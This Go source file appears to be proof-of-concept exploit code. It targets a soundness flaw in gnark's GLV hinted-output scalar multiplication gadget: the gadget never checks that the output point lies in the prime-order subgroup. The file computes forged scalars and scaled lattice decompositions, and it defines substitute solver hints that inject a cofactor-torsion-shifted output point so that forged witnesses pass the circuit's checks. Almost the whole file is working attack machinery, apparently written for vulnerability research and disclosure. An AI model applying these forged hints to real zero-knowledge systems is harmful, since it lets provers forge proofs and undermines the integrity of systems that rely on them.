package attack

// Shared machinery for the cofactor-torsion forgeries against gnark's
// hinted-output scalar multiplication (the GLV+fake-GLV method). The gadget
// hints the output Q=[s]P and certifies it with a fraction decomposition
// (u1,u2,v1,v2) satisfying, over the WHOLE curve,
//
//	[u1]P + [u2]psi(P) + [v1]Q + [v2]psi(Q) = 0        (identity)
//
// but never binds Q to the prime-order subgroup. Replacing the two solver hints
// (the decomposition and the output) lets a prover slip in Q' = Q + T for a
// rational ell-torsion point T, as long as the output-side residual
// [v1]T + [v2]psi(T) vanishes. Two families realize that:
//
//   - chosen-scalar: fix (u1,u2,v1,v2) = (1,0,0,ell); the residual is
//     [ell]psi(T) = 0 automatically, and the identity forces the scalar
//     s = -(ell*lambda)^{-1} mod r. Reaches every cofactor prime ell < 2^(N/4+2).
//
//   - any-scalar: keep the honest scalar and scale the honest decomposition by
//     ell, so (v1,v2) both vanish mod ell and [v1]T+[v2]psi(T)=0 for any
//     ell-torsion T. Fits the sub-scalar range only for small ell (2, 3).

import (
	"math/big"

	"github.com/consensys/gnark-crypto/algebra/lattice"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/std/math/emulated"
)

// anyScalar returns a fixed but arbitrary in-range scalar, to demonstrate that
// the any-scalar forgery works for a scalar the attacker does not choose.
func anyScalar(r *big.Int) *big.Int {
	s, _ := new(big.Int).SetString("31415926535897932384626433832795028841971693993751058209749445923078164062862", 10)
	return s.Mod(s, r)
}

// chosenScalar returns s = -(ell*lambda)^{-1} mod r, the scalar for which the
// forged decomposition (1,0,0,ell) certifies the torsion-shifted output.
func chosenScalar(lambda *big.Int, ell int64, r *big.Int) *big.Int {
	el := new(big.Int).Mul(big.NewInt(ell), lambda)
	el.Mod(el, r)
	inv := new(big.Int).ModInverse(el, r)
	s := new(big.Int).Neg(inv)
	return s.Mod(s, r)
}

// honestDecomp reproduces the gadget's own fraction decomposition for scalar s,
// using the very same lattice reconstructor the hint calls (k = -s):
// signed (u1,u2,v1,v2) with u1+lambda*u2 + s*(v1+lambda*v2) = 0 (mod r), each
// of size ~ r^(1/4).
func honestDecomp(s, r, lambda *big.Int) [4]*big.Int {
	k := new(big.Int).Neg(s)
	k.Mod(k, r)
	return lattice.RationalReconstructExt(k, r, lambda)
}

// scaleDecomp multiplies every coordinate by ell (the any-scalar both-zero
// route): the identity is preserved (0*ell=0 mod r) and v1,v2 vanish mod ell.
func scaleDecomp(v [4]*big.Int, ell int64) [4]*big.Int {
	var out [4]*big.Int
	for i := range v {
		out[i] = new(big.Int).Mul(v[i], big.NewInt(ell))
	}
	return out
}

// maxAbsBits returns the bit length of the largest |coordinate|, to check the
// forged decomposition fits the gadget's sub-scalar range 2^((N+3)/4+2).
func maxAbsBits(v [4]*big.Int) int {
	m := 0
	for i := range v {
		if b := v[i].BitLen(); b > m {
			m = b
		}
	}
	return m
}

// forgeDecompHint overrides the decomposition hint (rationalReconstructExt /
// rationalReconstructExtG2) to return a fixed signed vector (u1,u2,v1,v2). Both
// variants share the layout: 4 unsigned magnitudes (emulated outputs) + 4 signs
// (native outputs).
func forgeDecompHint(vec [4]*big.Int) solver.Hint {
	return func(field *big.Int, inputs, outputs []*big.Int) error {
		return emulated.UnwrapHintContext(field, inputs, outputs, func(hc emulated.HintContext) error {
			mod := hc.EmulatedModuli()[0]
			_, nativeOutputs := hc.NativeInputsOutputs()
			_, emuOutputs := hc.InputsOutputs(mod)
			for i := 0; i < 4; i++ {
				emuOutputs[i].Abs(vec[i])
				if vec[i].Sign() < 0 {
					nativeOutputs[i].SetUint64(1)
				} else {
					nativeOutputs[i].SetUint64(0)
				}
			}
			return nil
		})
	}
}

// forgeOutputHint overrides the scalar-mul hint (scalarMulHint / scalarMulG2Hint)
// to return a precomputed forged point. coords holds the affine coordinates as
// full integers: 2 for a prime-field group (G1, BW6-761 G2), 4 for an Fp2 group
// (BLS12-381/BN254 G2: X.A0, X.A1, Y.A0, Y.A1).
func forgeOutputHint(coords []*big.Int) solver.Hint {
	return func(field *big.Int, inputs, outputs []*big.Int) error {
		return emulated.UnwrapHintContext(field, inputs, outputs, func(hc emulated.HintContext) error {
			base := hc.EmulatedModuli()[0]
			_, baseOut := hc.InputsOutputs(base)
			for i := range coords {
				baseOut[i].Set(coords[i])
			}
			return nil
		})
	}
}
